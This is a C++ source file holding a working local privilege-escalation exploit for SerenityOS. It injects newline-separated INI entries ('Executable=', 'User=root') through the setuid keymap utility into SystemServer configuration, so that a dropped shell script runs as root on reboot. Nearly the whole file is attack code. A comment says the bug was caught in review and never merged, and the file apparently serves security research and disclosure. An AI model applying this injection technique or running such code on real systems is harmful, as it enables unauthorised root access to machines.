/*
 * Copyright (c) 2021, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

// keymap Config::write_entry INI injection phys->root LPE (-1day exploit)
// ---
// Uses ConfigFile::write_entry INI injection technique to modify SystemServer
// configuration.
// The `keymap` utility is setuid root, but executable only by the root user
// and users in the `phys` group:
// -rwsr-x---   1    root    phys      39984   2021-05-15 22:31:19  /bin/keymap
// ---
// Details:
// - https://github.com/SerenityOS/serenity/pull/6955#issuecomment-835744724
// - https://github.com/SerenityOS/serenity/issues/4535
// ---
// Note: This keymap bug was caught during review and never merged into SerenityOS.
// - https://github.com/SerenityOS/serenity/pull/6955#pullrequestreview-655049046
// See `keymap.cpp.vulnerable` for the original affected `keymap.cpp` source.
// ---
// ~ bcoles 2021-05-09

#include <LibCore/ArgsParser.h>
#include <LibCore/File.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

int main(int argc, char** argv)
{
    outln("keymap Config::write_entry INI injection phys->root LPE");

    const char* source_keymap = "/res/keymaps/en-us.json";
    bool reboot = false;

    Core::ArgsParser args_parser;
    args_parser.add_option(source_keymap, "Source keymap file (any valid keymap)", nullptr, 'f', "file");
    args_parser.add_option(reboot, "Reboot upon completion (default: false)", "reboot", 'r');
    args_parser.parse(argc, argv);

    outln("[.] Cleaning up previous exploit attempts...");
    system("rm -rf /tmp/zz*");

    // Our delicious INI data
    // NOTE: must end with ".json"
    // NOTE: Length limitations apply (somewhere in the setkeymap syscall). You can't use data much longer than this.
    String ini_data = "/tmp/zz\nExecutable=/home/anon/x\nUser=root\na=.json";

    // Write our payload to /home/anon/x
    system("echo '#!/bin/sh' > /home/anon/x");
    system("echo 'id>/tmp/pwned' >> /home/anon/x");
    system("chmod +x /home/anon/x");

    // Using slash '/' characters in the keymap file path causes all sorts of problems with
    // `CharacterMapFile::load_from_file()`, and `unveil()`, and `get_syscall_path_argument`, and ...
    //
    // Unfortunately, we kind of need slashes if we want to execute arbitrary files without resorting
    // to environment variables and other such grotesque degeneracy.
    //
    // Fortunately, we can work around this by creating a valid directory for each portion of the path.
    StringBuilder dirs;
    auto paths = ini_data.split_view('/', false);

    // Drop the last path - this will be our keymap file name, not a new directory
    paths.remove(paths.size() - 1);

    outln("[.] Creating necessary directories...");

    // Let's make some directories
    //   "/tmp/zz\nExecutable=/"
    //   "/tmp/zz\nExecutable=/home/"
    //   "/tmp/zz\nExecutable=/home/anon/"
    //   "/tmp/zz\nExecutable=/home/anon/x"
    //   ... etc ...
    for (const auto& item : paths) {
        dirs.append("/");
        dirs.append(item.to_string().characters());
        outln("[.] Creating directory: '{}' ...", dirs.to_string().characters());
        mkdir(dirs.to_string().characters(), 0755);
    }

    auto result = Core::File::copy_file_or_directory(ini_data, source_keymap);

    if (result.is_error())
        perror("copy_file");

    // NOTE: Lazily use system with shell globbing to pass the correct file path
    // as an argument to keymap because I can't be bothered parsing this properly.
    //
    // NOTE: This hard coded string is... hard coded.
    // You may need to change this if you change the INI data.
    system("/bin/keymap /tmp/zz*/home/anon/x*");

    outln("[.] Done. Payload will execute on reboot.");
    outln("[.] Unless you saw 'setkeymap: Success (not an error)'. In which case, note that this is a lie and is an error. Your INI data is probably too long.");

    // Users in the phys group also have permission to execute `reboot`.
    // Rebooting will trigger the payload.
    if (reboot) {
        int wait = 5;
        outln("[.] Rebooting in {} seconds... (ctrl+c to abort)", wait);
        sleep(wait);
        system("reboot");
    }

    return 0;
}

